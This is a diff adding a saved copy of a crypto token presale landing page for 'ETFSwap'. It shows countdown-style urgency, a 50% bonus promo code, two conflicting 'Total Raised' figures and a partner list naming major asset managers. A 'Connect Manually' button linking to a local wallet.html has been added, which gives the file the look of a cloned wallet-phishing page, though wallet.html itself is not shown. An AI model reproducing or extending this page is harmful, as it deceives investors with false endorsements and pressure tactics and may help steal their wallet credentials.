@@ -1,0 +1,2731 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-scrapbook-source="https://www.etfswappresale.com/" data-scrapbook-create="20241211003035256"
+  data-scrapbook-adoptedstylesheet-0="*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+
+button:disabled { cursor: not-allowed; }
+
+button svg, button wcm-text { position: relative; z-index: 1; }
+
+input { border: none; outline: 0px; appearance: none; }
+
+img { display: block; }
+
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }"
+  data-scrapbook-adoptedstylesheet-1=":host { all: initial; }
+
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+
+.wcm-active { pointer-events: auto; }
+
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}">
+
+<head>
+  <script charset="UTF-8" type="text/javascript" src="./05913fd8-ad22-403b-ba48-6d177a4a2b50.js"></script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="icon" type="image/x-icon" href="etfswap.png">
+  <meta property="og:image" content="assets/image/logo.png">
+  <meta name="twitter:image:src" content="images/logo.png">
+
+  <!-- <meta http-equiv="Cache-control" content="no-cache" /> -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="dns-preconnect" href="https://etfswappresale.com/home">
+  <link href="css2.css" rel="stylesheet">
+  <noscript>
+    <link rel="stylesheet" href="css2.css">
+  </noscript>
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- <noscript>
+      <link rel="stylesheet" href="https://etfswappresale.com/assets/index-DhyH39nG.css" />
+    </noscript> -->
+
+  <style>
+    .gt_switcher_wrapper {
+      right: 0 !important;
+    }
+  </style>
+
+  <link rel="stylesheet" href="index-DDRQIIlt.css">
+  <style data-emotion="css" data-s="">
+    .css-xuaqpw {
+      position: fixed;
+      display: flex;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      justify-content: center;
+      inset: 0px;
+      background-color: rgba(0, 0, 0, 0.5);
+      -webkit-tap-highlight-color: transparent;
+      color: rgb(255, 255, 255);
+      z-index: 1201;
+    }
+
+    .css-8yzpf7 {
+      display: inline-block;
+      animation: 1.4s linear 0s infinite normal none running animation-61bdi0;
+    }
+
+    @-webkit-keyframes animation-61bdi0 {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes animation-61bdi0 {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .css-13o7eu2 {
+      display: block;
+    }
+
+    .css-14891ef {
+      stroke: currentcolor;
+      stroke-dasharray: 80px, 200px;
+      stroke-dashoffset: 0;
+      animation: 1.4s ease-in-out 0s infinite normal none running animation-1p2h4ri;
+    }
+
+    @-webkit-keyframes animation-1p2h4ri {
+      0% {
+        stroke-dasharray: 1px, 200px;
+        stroke-dashoffset: 0;
+      }
+
+      50% {
+        stroke-dasharray: 100px, 200px;
+        stroke-dashoffset: -15px;
+      }
+
+      100% {
+        stroke-dasharray: 100px, 200px;
+        stroke-dashoffset: -125px;
+      }
+    }
+
+    @keyframes animation-1p2h4ri {
+      0% {
+        stroke-dasharray: 1px, 200px;
+        stroke-dashoffset: 0;
+      }
+
+      50% {
+        stroke-dasharray: 100px, 200px;
+        stroke-dashoffset: -15px;
+      }
+
+      100% {
+        stroke-dasharray: 100px, 200px;
+        stroke-dashoffset: -125px;
+      }
+    }
+  </style>
+  <title>ETFSwap tokenization platform tokenized ETFs in crypto</title>
+  <link rel="canonical" href="#" data-react-helmet="true">
+  <meta property="og:title" content="ETFSwap tokenization platform tokenized ETFs in crypto" data-react-helmet="true">
+  <meta name="twitter:title" content="ETFSwap tokenization platform tokenized ETFs in crypto" data-react-helmet="true">
+  <meta name="description"
+    content="ETFswap tokenization platform – your gateway to investing in listed ETFs in cryptocurrency. Engage with this highly liquid asset class of Tokenized ETFs"
+    data-react-helmet="true">
+  <meta property="description"
+    content="ETFswap tokenization platform – your gateway to investing in listed ETFs in cryptocurrency. Engage with this highly liquid asset class of Tokenized ETFs"
+    data-react-helmet="true">
+  <meta property="og:description"
+    content="ETFswap tokenization platform – your gateway to investing in listed ETFs in cryptocurrency. Engage with this highly liquid asset class of Tokenized ETFs"
+    data-react-helmet="true">
+  <meta name="twitter:description"
+    content="ETFswap tokenization platform – your gateway to investing in listed ETFs in cryptocurrency. Engage with this highly liquid asset class of Tokenized ETFs"
+    data-react-helmet="true">
+  <style class="gtranslate_css">
+    div.skiptranslate,
+    #google_translate_element2 {
+      display: none !important
+    }
+
+    body {
+      top: 0 !important
+    }
+
+    font font {
+      background-color: transparent !important;
+      box-shadow: none !important;
+      position: initial !important
+    }
+
+    .gt_float_switcher {
+      font-family: Arial;
+      font-size: 20px;
+      border-radius: 2px;
+      color: #555;
+      display: inline-block;
+      line-height: 20px;
+      box-shadow: rgba(0, 0, 0, 0.15) 0 5px 15px;
+      background: #fff;
+      overflow: hidden;
+      transition: all .5s cubic-bezier(0.4, 0, 1, 1)
+    }
+
+    .gt_float_switcher img {
+      vertical-align: middle;
+      display: inline-block;
+      width: 33px;
+      height: auto;
+      margin: 0 5px 0 0;
+      border-radius: 3px
+    }
+
+    .gt_float_switcher .gt_options {
+      position: relative;
+      z-index: 777;
+      max-height: 250px;
+      overflow-y: auto;
+      transform: translateY(-30px);
+      opacity: 0;
+      cursor: pointer;
+      transition: all .8s cubic-bezier(.3, 1.1, .4, 1.1)
+    }
+
+    .gt_float_switcher .gt_options a {
+      display: block;
+      text-decoration: none;
+      padding: 10px 15px;
+      color: #444;
+      transition: color .4s linear
+    }
+
+    .gt_float_switcher .gt-selected {
+      position: relative;
+      z-index: 888;
+      background-color: #fff;
+      cursor: pointer;
+      text-transform: uppercase;
+      overflow: hidden;
+      text-align: right
+    }
+
+    .gt_float_switcher .gt_options.gt-open {
+      opacity: 1;
+      transform: translateX(0px)
+    }
+
+    .gt_float_switcher .gt_options::-webkit-scrollbar-track {
+      background-color: #f5f5f5
+    }
+
+    .gt_float_switcher .gt_options::-webkit-scrollbar {
+      width: 5px
+    }
+
+    .gt_float_switcher .gt_options::-webkit-scrollbar-thumb {
+      background-color: #888
+    }
+
+    .gt_float_switcher .gt_options a:hover {
+      background: #6070a0;
+      color: #fff
+    }
+
+    .gt_float_switcher .gt_options a.gt-current {
+      display: none
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang {
+      padding: 10px 15px;
+      color: #333;
+      font-weight: bold
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang span.gt-lang-code {
+      position: relative;
+      top: 2px
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang span.gt_float_switcher-arrow {
+      display: inline-block;
+      height: 24px;
+      width: 15px;
+      vertical-align: middle;
+      background-image: url("80b5ab8e3e676d0e1419dbcefd900810f0051d35.svg");
+      background-position: 50%;
+      background-size: 11px;
+      background-repeat: no-repeat;
+      transition: all .3s;
+      transform: rotate(-180deg)
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang span.gt_float_switcher-arrow.gt_arrow_rotate {
+      transform: rotate(0deg)
+    }
+  </style>
+  <link rel="stylesheet" href="floatbutton1_5Exiot6Sf7v3AnSCYZCRZjPr5YSBSZklIEwXMYBHeiQ__HoYNWnSox54GymPQ7Gt_.css">
+  <link rel="stylesheet"
+    href="floatbuttonpostload_4SlLnzqcbdEfEQtJDHaw9zhBEKW19m-9AOX58b13QxjVum9m9Ua19owar4iyZOKj_.css">
+  <script
+    data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["wcm-explorer-context", "wcm-theme-context", "wcm-modal"])</script>
+</head>
+
+<body>
+  <div id="root">
+    <div data-rk="">
+      <style>
+        [data-rk] {
+          --rk-blurs-modalOverlay: blur(4px);
+          --rk-fonts-body: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+          --rk-radii-actionButton: 10px;
+          --rk-radii-connectButton: 8px;
+          --rk-radii-menuButton: 8px;
+          --rk-radii-modal: 16px;
+          --rk-radii-modalMobile: 18px;
+          --rk-colors-accentColor: linear-gradient(45deg, #ac50ef, #7059fb 50%, #2ecff6);
+          --rk-colors-accentColorForeground: white;
+          --rk-colors-actionButtonBorder: rgba(255, 255, 255, 0.04);
+          --rk-colors-actionButtonBorderMobile: rgba(255, 255, 255, 0.08);
+          --rk-colors-actionButtonSecondaryBackground: rgba(255, 255, 255, 0.08);
+          --rk-colors-closeButton: rgba(224, 232, 255, 0.6);
+          --rk-colors-closeButtonBackground: rgba(255, 255, 255, 0.08);
+          --rk-colors-connectButtonBackground: #1A1B1F;
+          --rk-colors-connectButtonBackgroundError: #FF494A;
+          --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));
+          --rk-colors-connectButtonText: #FFF;
+          --rk-colors-connectButtonTextError: #FFF;
+          --rk-colors-connectionIndicator: #30E000;
+          --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;
+          --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;
+          --rk-colors-error: #FF494A;
+          --rk-colors-generalBorder: rgba(255, 255, 255, 0.08);
+          --rk-colors-generalBorderDim: rgba(255, 255, 255, 0.04);
+          --rk-colors-menuItemBackground: rgba(224, 232, 255, 0.1);
+          --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.5);
+          --rk-colors-modalBackground: #1A1B1F;
+          --rk-colors-modalBorder: rgba(255, 255, 255, 0.08);
+          --rk-colors-modalText: #FFF;
+          --rk-colors-modalTextDim: rgba(224, 232, 255, 0.3);
+          --rk-colors-modalTextSecondary: rgba(255, 255, 255, 0.6);
+          --rk-colors-profileAction: rgba(224, 232, 255, 0.1);
+          --rk-colors-profileActionHover: rgba(224, 232, 255, 0.2);
+          --rk-colors-profileForeground: rgba(224, 232, 255, 0.05);
+          --rk-colors-selectedOptionBorder: rgba(224, 232, 255, 0.1);
+          --rk-colors-standby: #FFD641;
+          --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+          --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+          --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+          --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+          --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.24);
+          --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16);
+        }
+      </style>
+      <div>
+        <div aria-hidden="true" class="MuiBackdrop-root css-xuaqpw"
+          style="opacity: 0; transition: opacity 195ms cubic-bezier(0.4, 0, 0.2, 1) 0ms; visibility: hidden;"><span
+            class="MuiCircularProgress-root MuiCircularProgress-indeterminate MuiCircularProgress-colorInherit css-8yzpf7"
+            role="progressbar" style="width: 40px; height: 40px;"><svg class="MuiCircularProgress-svg css-13o7eu2"
+              viewBox="22 22 44 44">
+              <circle class="MuiCircularProgress-circle MuiCircularProgress-circleIndeterminate css-14891ef" cx="44"
+                cy="44" r="20.2" fill="none" stroke-width="3.6"></circle>
+            </svg></span></div>
+      </div>
+      <div class="Toastify"></div>
+      <header class="header">
+        <div class="container-fluid">
+          <div class="header-content">
+            <nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="" aria-label="ETFSwap"><img
+                  src="logo.png" alt="ETFSwap logo" class="img-fluid" loading="lazy"></a><button class="navbar-toggler "
+                type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav"
+                aria-expanded="false" aria-label="Toggle navigation" style="z-index: 999; border: none;"><span
+                  class="navbar-toggler-icons"></span><span class="navbar-toggler-icons"></span><span
+                  class="navbar-toggler-icons"></span></button>
+              <div class=" navbar-collapse collapse" id="navbarNav" style="z-index: 99;">
+                <ul class="navbar-nav">
+                  <li class="nav-item"><a class="interact-button nav-link"
+                      href="#">Features</a></li>
+                  <li class="nav-item"><a class="interact-button nav-link"
+                      href="#">staking</a></li>
+                  <li class="nav-item"><a class="interact-button nav-link" href="#">why etfs</a>
+                  </li>
+                  <li class="nav-item"><a class="interact-button nav-link"
+                      href="#">tokenomics</a></li>
+                  <li class="nav-item"><a class="interact-button nav-link"
+                      href="#">roadmap</a></li>
+                  <li class="nav-item"><a class="interact-button nav-link" href="#">faq</a></li>
+                  <li class="nav-item"><a class="interact-button nav-link" href="#"
+                      target="_blank">Whitepaper</a></li>
+                  <li class="nav-item"><a class="interact-button nav-link" href="#">Blogs</a></li>
+                </ul>
+              </div>
+              <ul class="header-button">
+                <li class="button-list"><button class="interact-button btn btn-outline-light">Connect wallet</button></li>
+                <li class="button-list"><button class="interact-button btn btn-outline-light">Login</button></li>
+                <li class="button-list"><button class="interact-button btn btn-primary">Sign up</button></li>
+              </ul>
+            </nav>
+          </div>
+        </div>
+      </header>
+      <div class="page-min-height">
+        <section class="landing-section">
+          <div class="container">
+            <div class="landing-content">
+              <div class="row d-flex align-items-center">
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="landing-detail">
+                    <div class="heading">
+                      <h1 class="main-title">Tokenized ETFs</h1>
+                      <h2 class="main-subtitle">Invest in ETFs Listed on the Blockchain</h2>
+                    </div>
+                    <p class="description">Welcome to ETFSwap, your dedicated tokenization platform for ETFs in
+                      cryptocurrency. Engage with this highly liquid asset class and benefit from the advantages of 24/7
+                      risk management, flexibility, and seamless trading opportunities offered by ETF tokenization. Join
+                      us to explore the potential of blockchain ETFs.</p><a
+                      href="#" target="_blank"><img class="w-100"
+                        src="banner.png" alt="ETH" loading="lazy"></a>
+                    <div class="interact-button mb-3 mt-3">ETFSwap Contract Address: <a class="interact-button anchor" target="_blank"
+                        href="#">0xcE6b17c16Df188fa721632b770a2ee5530589716</a>
+                    </div>
+                    <div><a class="anchor" target="_blank"
+                        href="#"><img class="w-100"
+                          src="solidproof-C4noQ2H1.png" alt="Solid Proof"></a></div>
+                  </div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="landing-timer">
+                    <div class="main">
+                      <h2>TOKEN PRESALE STAGE 4 ENDS SOON</h2>
+                    </div>
+                    <div class="interact-button ">
+                      <div class="current-stage d-flex align-items-center justify-content-center border-btm">
+                        <h5 class="text-light">Use promo <span class="text-goldenfizz">"ETFS50"</span> to get <span
+                            class="text-goldenfizz">50%</span> bonus</h5>
+                      </div>
+                      <div class="current-stage d-flex align-items-center justify-content-between flex-row-reverse">
+                        <div class="">
+                          <p class=" ">Current Stage</p>
+                          <h2 class="">Stage 4</h2>
+                        </div>
+                        <div class="flex flex-col items-end">
+                          <p class="">Total Raised</p>
+                          <h2 class="">$1034854.55</h2>
+                        </div>
+                      </div>
+                      <div class="remaining d-flex justify-content-between">
+                        <div class="d-flex align-items-center">
+                          <div class="mx-2">
+                            <div><span>99.9967% Sold</span></div>
+                          </div>
+                        </div>
+                        <div class="d-flex flex-column"><span class="cyanaqua" style="color: rgb(255, 255, 255);">588.84
+                            ETFS</span><span class="text-end" style="color: rgb(0, 255, 255);">Remaining</span></div>
+                        <div class="probar absolute "
+                          style="width: 100%; height: 10px; background-color: rgb(0, 255, 255);">
+                          <div class="animate-loading"
+                            style="width: 99.9967%; background-color: rgb(255, 255, 255); position: relative; height: 100%; z-index: 1;">
+                          </div>
+                        </div>
+                      </div>
+                      <div class="d-flex justify-content-between align-items-center flex-column usd-box">
+                        <div>1 ETFS = <span class="text-silvertree"> 0.05769</span> USD</div>
+                      </div>
+                      <div class="p-2 sm:p-2 d-flex flex-column justify-content-center text-center">
+                        <div class="tokensold" style="color: rgb(255, 255, 255); font-weight: 600;"><span
+                            class="tokensold"
+                            style="font-size: 18px; color: rgb(0, 255, 255); margin-right: 4px;">17999411.16</span>Tokens
+                          Sold</div>
+                        <div class="tokensold" style="color: rgb(255, 255, 255); font-weight: 600;"><span
+                            style="color: rgb(255, 255, 255);">Total Raised:</span><span class="tokensold"
+                            style="font-size: 18px; color: rgb(255, 255, 255); margin-right: 4px;"> $4.76M</span></div>
+                      </div><button
+                        class="interact-button btn btn-primary w-100 mt-2 text-center align-items-center d-flex justify-content-center">Connect Wallet</button>
+                        <a href="wallet.html"<button
+                        class=" btn btn-primary w-100 mt-2 text-center align-items-center d-flex justify-content-center">Connect Manually</button></div>
+                        <a class="interact-button simple-link text-center mt-3 mx-auto w-100 d-block"
+                        href="#" target="_blank">How to
+                        Buy?</a><a class="interact-button simple-link text-center mt-3 mx-auto w-100 d-block"
+                        href="#" target="_blank"><img loading="lazy"
+                          class="w-100" src="cmc-DX8EdZQ3.png" alt="BNB"></a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="partner-section">
+          <div class="container">
+            <div class="partner-content">
+              <div class="heading">
+                <h2>Our Network</h2>
+              </div>
+              <div class="partner-slider">
+                <div class="slick-slider slick-initialized" dir="ltr">
+                  <div class="slick-arrow slick-prev"><img src="Group185.png" alt="previous"></div>
+                  <div class="slick-list" style="padding: 0px;">
+                    <div class="slick-track"
+                      style="width: 6760px; opacity: 1; transform: translate3d(-2080px, 0px, 0px);">
+                      <div data-index="-6" tabindex="-1" class="slick-slide slick-center slick-cloned"
+                        aria-hidden="true" style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner5.png" alt="ARK Invest" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="-5" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner6.png" alt="Ethereum" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="-4" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner7.png" alt="Grayscale" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="-3" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner8.png" alt="Vaneck" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="-2" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner9.png" alt="SEBABANK" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="-1" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner10.png" alt="Polygon" class="img-fluid"
+                                width="207" height="49"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="0" class="slick-slide" tabindex="-1" aria-hidden="true"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner1.png" alt="chainlink etf platform"
+                                class="img-fluid"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="1" class="slick-slide" tabindex="-1" aria-hidden="true"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner2.png" alt="iShares" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="2" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner3.png" alt="blackrock" class="img-fluid"
+                                width="223" height="45"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="3" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner4.png" alt="Arbitrum" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="4" class="slick-slide slick-active slick-center slick-current" tabindex="-1"
+                        aria-hidden="false" style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner5.png" alt="ARK Invest" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="5" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner6.png" alt="Ethereum" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="6" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner7.png" alt="Grayscale" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="7" class="slick-slide" tabindex="-1" aria-hidden="true"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner8.png" alt="Vaneck" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="8" class="slick-slide" tabindex="-1" aria-hidden="true"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner9.png" alt="SEBABANK" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="9" class="slick-slide" tabindex="-1" aria-hidden="true"
+                        style="outline: none; width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner10.png" alt="Polygon" class="img-fluid"
+                                width="207" height="49"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="10" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner1.png" alt="chainlink etf platform"
+                                class="img-fluid"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="11" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner2.png" alt="iShares" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="12" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner3.png" alt="blackrock" class="img-fluid"
+                                width="223" height="45"></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="13" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner4.png" alt="Arbitrum" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="14" tabindex="-1" class="slick-slide slick-center slick-cloned"
+                        aria-hidden="true" style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner5.png" alt="ARK Invest" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="15" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner6.png" alt="Ethereum" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="16" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner7.png" alt="Grayscale" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="17" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner8.png" alt="Vaneck" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
